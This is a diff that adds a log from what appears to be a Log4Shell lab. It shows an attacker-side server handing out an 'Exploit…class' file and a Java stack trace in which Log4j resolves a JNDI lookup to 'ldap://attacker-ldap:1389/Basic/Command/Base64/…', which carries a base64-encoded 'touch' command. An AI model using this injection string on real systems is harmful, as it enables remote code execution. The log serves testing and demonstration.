@@ -1,0 +1,29 @@
+[+] New HTTP Request From /172.21.0.3:60502  /Exploitt9L2pa0wmf.class
+[+] Receive ClassRequest: Exploitt9L2pa0wmf.class
+[+] Response Code: 200
+
+WARN Error looking up JNDI resource [ldap://attacker-ldap:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9pd29ya2VkCg==]. 
+javax.naming.NamingException: problem generating object using object factory
+remaining name '"Basic/Command/Base64/dG91Y2ggL3RtcC9pd29ya2VkCg=="'
+at com.sun.jndi.ldap.LdapCtx.c_lookup(LdapCtx.java:1092)
+at com.sun.jndi.toolkit.ctx.ComponentContext.p_lookup(ComponentContext.java:542)
+at com.sun.jndi.toolkit.ctx.PartialCompositeContext.lookup(PartialCompositeContext.java:177)
+at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)
+at com.sun.jndi.url.ldap.ldapURLContext.lookup(ldapURLContext.java:94)
+at javax.naming.InitialContext.lookup(InitialContext.java:417)
+at org.apache.logging.log4j.core.net.JndiManager.lookup(JndiManager.java:172)
+...
+at org.apache.logging.log4j.spi.AbstractLogger.info(AbstractLogger.java:1320)
+at fr.christophetd.log4shell.vulnerableapp.MainController.index(MainController.java:18)
+...
+at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:898)
+at javax.servlet.http.HttpServlet.service(HttpServlet.java:655)
+...
+   at java.lang.Thread.run(Thread.java:748)
+Caused by: java.lang.ClassCastException: Exploitt9L2pa0wmf cannot be cast to javax.naming.spi.ObjectFactory
+   at javax.naming.spi.NamingManager.getObjectFactoryFromReference(NamingManager.java:163)
+   at javax.naming.spi.DirectoryManager.getObjectInstance(DirectoryManager.java:189)
+   at com.sun.jndi.ldap.LdapCtx.c_lookup(LdapCtx.java:1085)
+   ... 88 more
+
+
